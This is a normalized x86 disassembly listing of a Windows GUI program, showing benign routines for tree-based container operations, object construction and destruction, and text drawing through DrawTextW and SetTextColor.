mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_421c70
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_421c10
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_421c10
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_421c70
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_429fa0
push ebp
mov ebp esp
push 0xffffffff
push sub_446bca
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov esi edi
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_429fa0
mov esi [ esi ]
lea eax [ edi + 0xc ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push edi
call [ operator delete@IAT ]
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov edi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_42a030
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_42a080
push ebp
mov ebp esp
sub esp 0x8
cmp [ edi + 0x8 ] 0x0
push ebx
mov ebx eax
lea edx [ ebx + 0xc ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ edi + 0x4 ]
push ebx
push 0x1
push esi
push edi
call sub_42a350
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ecx eax
jne r-xdata
lea eax [ ecx + 0xc ]
push edx
call sub_401d60
test al al
je r-xdata
lea eax [ ecx + 0xc ]
push edx
call sub_401d60
test al al
je r-xdata
mov eax [ eax + 0x8 ]
add eax 0xc
push eax
mov eax edx
call sub_401d60
test al al
je r-xdata
push ebx
push edi
lea ebx [ ebp - 0x8 ]
call sub_42a1e0
mov eax [ eax ]
mov [ esi ] eax
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xc
push ecx
lea eax [ ebx + 0xc ]
call sub_401d60
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ecx
call sub_42a5d0
mov edx [ ebp - 0x4 ]
add edx 0xc
push edx
lea eax [ ebx + 0xc ]
call sub_401d60
test al al
je r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x8 ]
push ebx
push 0x0
push esi
push edi
call sub_42a350
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edx
call sub_42a030
mov eax [ ebp - 0x4 ]
cmp eax [ edi + 0x4 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
push ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
push ebx
jne r-xdata
lea ecx [ ebx + 0xc ]
add eax 0xc
push ecx
call sub_401d60
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
push esi
push edi
call sub_42a350
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x0
push esi
push edi
call sub_42a350
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x1
push esi
push edi
mov ecx eax
call sub_42a350
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
sub_42a1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_447a0a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov esi [ eax + 0x4 ]
cmp [ esi + 0x15 ] 0x0
mov edi eax
mov al 0x1
mov [ ebp - 0x14 ] al
jne r-xdata
mov esi edi
mov [ ebp - 0x10 ] esi
test al al
je r-xdata
mov ecx [ esi + 0xc ]
xor eax eax
test ecx ecx
setne al
mov edi esi
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0xc ]
push ecx
add eax 0xc
call sub_401d60
test al al
je r-xdata
mov eax [ ecx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
push 0x80004005
call sub_402d00
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
push edx
mov ecx edi
call sub_42a350
mov eax [ eax ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x1
jmp r-xdata
lea eax [ ebp - 0x10 ]
call sub_42a5d0
mov esi [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
push eax
push 0x1
lea edx [ ebp + 0xc ]
push edx
push ecx
mov ecx edi
call sub_42a350
mov eax [ eax ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x1
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call [ operator delete@IAT ]
add esp 0x4
mov [ ebx ] esi
mov [ ebx + 0x4 ] 0x0
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov esi [ esi + 0x8 ]
mov esi [ esi ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ esi + 0x15 ] 0x0
je r-xdata
test eax eax
sets al
mov [ ebp - 0x14 ] al
test al al
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_42a350
push ebp
mov ebp esp
push 0xffffffff
push sub_4479ca
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
cmp edx 0x1ffffffe
jb r-xdata
mov edi [ ebp + 0x14 ]
inc edx
mov [ eax + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ eax + 0x4 ]
xor bl bl
cmp ecx edx
jne r-xdata
mov esi [ ebp + 0x14 ]
lea eax [ esi + 0xc ]
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
cmp [ ebp + 0x10 ] bl
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ eax + 0x4 ]
mov [ ecx ] edi
mov edx [ eax + 0x4 ]
jmp r-xdata
push esi
call [ operator delete@IAT ]
add esp 0x4
push r--data
call [ std::_Xlength_error@IAT ]
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ ecx + 0x8 ] edi
mov edx [ eax + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ eax + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x14 ] bl
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0xc ]
mov [ ecx + 0x14 ] 0x1
mov [ eax ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
mov esi [ esi ]
cmp [ esi + 0x14 ] bl
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] bl
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] bl
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ eax + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ eax + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_42a5d0
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov [ eax ] edx
retn
nop
retn
mov [ eax ] ecx
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_42a630
push ebp
mov ebp esp
push 0xffffffff
push sub_447988
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
push 0x18
call [ operator new@IAT ]
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
xor ebx ebx
cmp esi ebx
je r-xdata
mov [ ebp + 0x8 ] ebx
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x24 ]
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x24 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push r--data
lea eax [ ebp - 0x24 ]
push eax
call _CxxThrowException
mov eax [ edi + 0x4 ]
mov [ esi ] eax
mov ecx [ edi + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ edi + 0x4 ]
mov [ esi + 0x8 ] edx
mov [ esi + 0x14 ] bx
mov [ ebp - 0x4 ] 0x1
lea edi [ esi + 0xc ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x2
cmp edi ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
sub eax 0x10
call sub_4025f0
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] 0x4
mov eax [ ebx + 0x4 ]
mov [ edi + 0x4 ] eax
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x4 ] 0x2
sub_42a730
push ebp
mov ebp esp
push 0xffffffff
push sub_44793e
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_40e3c0
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x70 ] r--data
mov al 0x1
mov [ ebp - 0x4 ] al
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x68 ] al
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x78 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0x7c ] ebx
mov [ esi + 0x80 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x88 ] ebx
mov [ esi + 0xc ] 0x15
mov [ esi + 0x74 ] bl
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a7f0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_42a820
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42a820
push ebp
mov ebp esp
push 0xffffffff
push sub_445a8e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x78 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_42a8d0
push esi
push edi
mov esi ecx
mov ecx [ esi - 0x54 ]
lea edi [ esi - 0x70 ]
push edi
push 0x2a3
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x20
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x200
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x201
call sub_412fd0
mov ecx [ esi - 0x54 ]
push edi
push 0x202
call sub_412fd0
pop edi
pop esi
retn
sub_42a920
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
push edi
mov [ esp + 0x10 ] eax
je r-xdata
mov ecx [ esp + 0x4c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
mov edi [ esi + 0x4 ]
mov [ esp + 0xc ] ecx
lea ecx [ edi + 0xb0 ]
lea ebx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x0
call sub_414260
mov eax [ esp + 0x18 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
je r-xdata
xor eax eax
cmp [ esi + 0x27 ] al
je r-xdata
cmp [ esi + 0x74 ] 0x0
mov eax 0x3
je r-xdata
cmp [ esi + 0x74 ] al
je r-xdata
mov edi [ esi + 0x6c ]
mov edx [ ebx ]
mov edx [ edx + 0xc ]
shr edi 0x1
add edi eax
mov eax [ ebx + 0x14 ]
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0xc ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov ecx eax
imul ecx edi
mov edi [ ebx + 0x10 ]
lea edx [ ecx + eax ]
mov eax [ esi + 0x30 ]
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x34 ]
mov [ esp + 0x34 ] edx
sub edx ecx
add edx [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
mov eax [ esi + 0x38 ]
mov [ esp + 0x24 ] eax
mov eax [ esi + 0x3c ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x2c ] ecx
mov ecx [ esp + 0x20 ]
mov edx eax
sub edx ecx
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x38 ] edi
cmp edi edx
jge r-xdata
mov eax 0x7
mov eax 0x4
jmp r-xdata
add edi ecx
push 0x1
lea ecx [ esp + 0x30 ]
push ecx
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x24 ]
push edx
mov [ esp + 0x34 ] edi
mov eax [ ebx ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx ebx
call edx
mov eax [ esi + 0x78 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
sub eax edi
sub eax ecx
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov [ esp + 0x20 ] ecx
mov edx [ esi + 0x38 ]
mov ecx [ esi + 0x34 ]
mov eax [ esi + 0x30 ]
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x34 ]
sub edx [ esp + 0x2c ]
cmp [ esi + 0x74 ] 0x0
mov [ esp + 0x20 ] ecx
mov ecx [ esi + 0x3c ]
lea eax [ eax + edx + 0x8 ]
mov edx [ esi + 0x34 ]
mov [ esp + 0x28 ] ecx
mov ecx [ esi + 0x30 ]
mov [ esi + 0x7c ] ecx
mov ecx [ esi + 0x4 ]
mov [ esi + 0x80 ] edx
mov edx [ esi + 0x3c ]
mov [ esi + 0x88 ] edx
mov [ esp + 0x1c ] eax
mov [ esi + 0x84 ] eax
mov eax [ ecx + 0x80 ]
je r-xdata
cmp [ esi + 0x27 ] 0x0
jne r-xdata
mov eax [ ecx + 0x84 ]
mov edi [ esp + 0xc ]
push eax
push edi
call [ SetTextColor@IAT ]
mov [ esp + 0xc ] eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x8c ]
mov ebx [ SelectObject@IAT ]
push eax
push edi
call ebx
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
push 0x624
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x28 ]
mov [ esp + 0x44 ] edx
lea edx [ esp + 0x40 ]
push edx
mov [ esp + 0x4c ] eax
mov eax [ esi + 0x78 ]
push 0xffffffff
mov [ esp + 0x48 ] ecx
mov ecx [ esp + 0x34 ]
push eax
push edi
mov [ esp + 0x5c ] ecx
call [ DrawTextW@IAT ]
mov ecx [ esp + 0x44 ]
mov eax [ esi + 0x78 ]
sub ecx [ esp + 0x3c ]
push 0x224
add [ esi + 0x84 ] ecx
lea edx [ esp + 0x20 ]
push edx
push 0xffffffff
push eax
push edi
call [ DrawTextW@IAT ]
mov ecx [ esp + 0xc ]
push ecx
push edi
call [ SetTextColor@IAT ]
mov edx [ esp + 0x10 ]
push edx
push edi
call ebx
mov eax [ rw-data ]
sub_42ab90
mov eax ecx
cmp [ eax + 0x1c ] 0x0
je r-xdata
retn
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push esi
movzx esi [ eax + 0x74 ]
push esi
mov esi [ eax + 0x8 ]
push esi
push 0x500
push eax
mov eax [ edx + 0x10 ]
call eax
pop esi
sub_42abc0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
mov eax [ esi + 0x6c ]
je r-xdata
test al 0x2
je r-xdata
test al 0x6
jne r-xdata
xor eax eax
pop esi
pop ebp
retn 0x14
and eax 0xfffffffd
cmp [ esi + 0x27 ] 0x0
mov [ esi + 0x6c ] eax
je r-xdata
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x1
mov eax 0x1
pop esi
pop ebp
retn 0x14
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax esi
call sub_426dd0
or [ esi + 0x6c ] 0x2
cmp [ esi + 0x27 ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x3c ]
push esi
call edx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x6c ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov eax esi
call sub_426dd0
mov eax [ ebp + 0x14 ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x38 ]
push 0x1
push eax
mov eax [ ebp + 0x10 ]
push eax
push 0x200
call edx
sub_42ac50
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x74 ] 0x0
mov [ esi + 0x6c ] 0x2
sete al
cmp [ esi + 0x24 ] 0x0
mov [ esi + 0x74 ] al
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x90 ]
mov ecx esi
call eax
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x1
xor eax eax
pop esi
pop ebp
retn 0x10
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
xor edx edx
cmp [ esi + 0x74 ] dl
setne dl
push edx
mov edx [ esi + 0x8 ]
push edx
push 0x111
push esi
call eax
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_42acf0
push ebp
mov ebp esp
push 0xffffffff
push sub_44793e
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_40e3c0
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x70 ] r--data
mov al 0x1
mov [ ebp - 0x4 ] al
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x68 ] al
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x78 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0xc ] 0x12
mov [ esi + 0x74 ] bl
mov [ esi + 0x80 ] ebx
mov [ esi + 0x7c ] bl
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42adb0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_42ade0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42ade0
push ebp
mov ebp esp
push 0xffffffff
push sub_445a8e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
xor ecx ecx
mov [ ebp - 0x4 ] ecx
